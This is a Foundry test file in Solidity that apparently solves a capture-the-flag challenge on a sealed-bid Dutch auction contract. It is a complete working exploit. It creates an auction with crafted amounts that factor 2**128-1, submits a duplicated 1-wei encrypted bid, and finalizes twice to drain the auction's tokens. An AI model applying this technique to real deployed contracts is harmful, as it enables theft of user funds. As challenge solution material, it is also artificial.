// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Token} from "../../src/dutch2/Token.sol";
import {AuctionManager} from "../../src/dutch2/AuctionManager.sol";
import {Challenge} from "../../src/dutch2/Challenge.sol";
import {Math} from "../../src/dutch2/util/Math.sol";

contract ExploitTest is Test {
    address player = address(0x123);
    address player2 = address(0x456);
    Token quoteToken;
    Token baseToken;
    AuctionManager auction;
    Challenge challenge;

    function setUp() public {
        // WETH/USDC
        quoteToken = new Token("USD Coin", "USDC", 6);
        baseToken = new Token("Wrapped Ethereum", "WETH", 18);

        auction = new AuctionManager();

        // Auction has 10000 USDC, 100 WETH
        quoteToken.mint(address(auction), 10000 * 1e6);
        baseToken.mint(address(auction), 100 * 1e18);

        // Player has 100 USDC, 100 WETH
        quoteToken.mint(player, 100 ether);
        baseToken.mint(player, 100 ether);

        challenge = new Challenge(auction, quoteToken, baseToken);
    }

    function test_Exploit() public {
        vm.warp(1);
        vm.startPrank(player);
        baseToken.approve(address(auction), type(uint256).max);
        uint256 privateKey = 0x1;
        Math.Point memory publicKey = Math.publicKey(privateKey);
        // factorization of 2**128-1 = totalBase * totalQuote
        uint128 amountBase = 92826887214783219843; // around 92e18
        uint128 amountQuote = 3665773755114633685; // around 3.66e18
        AuctionManager.AuctionParameters memory params = AuctionManager
            .AuctionParameters({
                tokenBase: address(baseToken),
                tokenQuote: address(quoteToken),
                minBid: 1 ether,
                totalBase: amountBase,
                resQuoteBase: 1 * uint256(type(uint128).max),
                merkle: bytes32(0),
                publicKey: publicKey
            });
        AuctionManager.Time memory time = AuctionManager.Time({
            start: 1,
            end: 3,
            startVesting: 3,
            endVesting: 3,
            cliff: 0
        });
        uint256 aid = auction.create(params, time);
        quoteToken.transfer(address(player2), 10 ether);
        vm.stopPrank();

        vm.startPrank(player2);
        quoteToken.approve(address(auction), 10 ether);
        uint256 privateKey2 = 0x2;
        Math.Point memory publicKey2 = Math.publicKey(privateKey2);
        // convert (2**128 * 1) to bytes32, represents buying only 1 (wei) base token
        bytes32 message = hex"0000000000000000000000000000000100000000000000000000000000000000";
        bytes32 commit = auction.genCommitment(message);
        (, bytes32 encryptedBid) = Math.encrypt(
            publicKey,
            privateKey2,
            message
        );
        auction.addBid(
            aid,
            amountQuote,
            commit,
            publicKey2,
            encryptedBid,
            new bytes32[](0)
        );
        auction.addBid(
            aid,
            amountQuote,
            commit,
            publicKey2,
            encryptedBid,
            new bytes32[](0)
        );
        vm.stopPrank();

        vm.warp(5);
        vm.startPrank(player);
        auction.show(aid, privateKey, new bytes(0));
        uint256[] memory indices = new uint256[](2);
        indices[0] = 0;
        indices[1] = 1;
        auction.finalize(aid, indices, amountBase, type(uint128).max);
        console.log("Player base token balance:", baseToken.balanceOf(player));
        console.log(
            "Auction base token balance:",
            baseToken.balanceOf(address(auction))
        );
        baseToken.transfer(address(auction), baseToken.balanceOf(player));
        quoteToken.transfer(address(auction), 7331547510229267370 - 1e10);
        auction.finalize(aid, indices, amountBase, type(uint128).max);
        console.log(
            "Final auction's quote token amount:",
            quoteToken.balanceOf(address(auction))
        );
        console.log("is solved", challenge.isSolved());
        vm.stopPrank();
    }
}
